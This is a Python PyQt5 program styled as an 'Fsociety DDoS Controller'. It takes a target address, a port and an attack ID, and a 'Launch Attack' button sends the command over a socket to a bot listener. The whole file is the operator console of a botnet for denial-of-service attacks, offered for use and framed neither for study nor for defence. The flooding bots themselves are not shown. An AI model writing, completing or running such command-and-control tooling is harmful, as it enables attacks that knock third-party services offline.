import sys
import socket
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton,
    QVBoxLayout, QLineEdit, QTextEdit, QHBoxLayout
)
from PyQt5.QtGui import QPixmap, QPalette, QBrush, QFont
from PyQt5.QtCore import Qt
import threading

class GUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety DDoS Controller")
        self.setGeometry(100, 100, 600, 400)

        # Background
        self.setAutoFillBackground(True)
        palette = QPalette()
        bg = QPixmap("assets/background.png").scaled(self.size(), Qt.IgnoreAspectRatio)
        palette.setBrush(QPalette.Window, QBrush(bg))
        self.setPalette(palette)

        # Fonts
        font = QFont("Courier", 10, QFont.Bold)
        label_font = QFont("Courier", 12, QFont.Bold)

        # UI Elements
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Target IP or Domain")
        self.target_input.setFont(font)

        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Port (e.g. 80)")
        self.port_input.setFont(font)

        self.attack_id = QLineEdit()
        self.attack_id.setPlaceholderText("Attack ID")
        self.attack_id.setFont(font)

        self.status_box = QTextEdit()
        self.status_box.setFont(font)
        self.status_box.setReadOnly(True)

        self.start_btn = QPushButton("Launch Attack")
        self.start_btn.setFont(label_font)
        self.start_btn.clicked.connect(self.start_attack)

        layout = QVBoxLayout()
        layout.addWidget(QLabel("Target:"))
        layout.addWidget(self.target_input)
        layout.addWidget(QLabel("Port:"))
        layout.addWidget(self.port_input)
        layout.addWidget(QLabel("Attack ID:"))
        layout.addWidget(self.attack_id)
        layout.addWidget(self.start_btn)
        layout.addWidget(QLabel("Status:"))
        layout.addWidget(self.status_box)

        self.setLayout(layout)

    def start_attack(self):
        target = self.target_input.text()
        port = int(self.port_input.text())
        attack_id = self.attack_id.text()

        if not target or not port or not attack_id:
            self.status_box.append("❌ Fill in all fields!")
            return

        self.status_box.append(f"🚀 Sending command to bot: {target}:{port} | ID: {attack_id}")
        threading.Thread(target=self.send_command_to_bots, args=(target, port, attack_id)).start()

    def send_command_to_bots(self, target, port, attack_id):
        try:
            sock = socket.socket()
            sock.connect(("0.0.0.0", 9999))  # Change to actual bot listener IP
            msg = f"{attack_id}|{target}|{port}"
            sock.send(msg.encode())
            sock.close()
            self.status_box.append("✅ Command sent to bot.")
        except Exception as e:
            self.status_box.append(f"❌ Failed: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = GUI()
    gui.show()
    sys.exit(app.exec_())
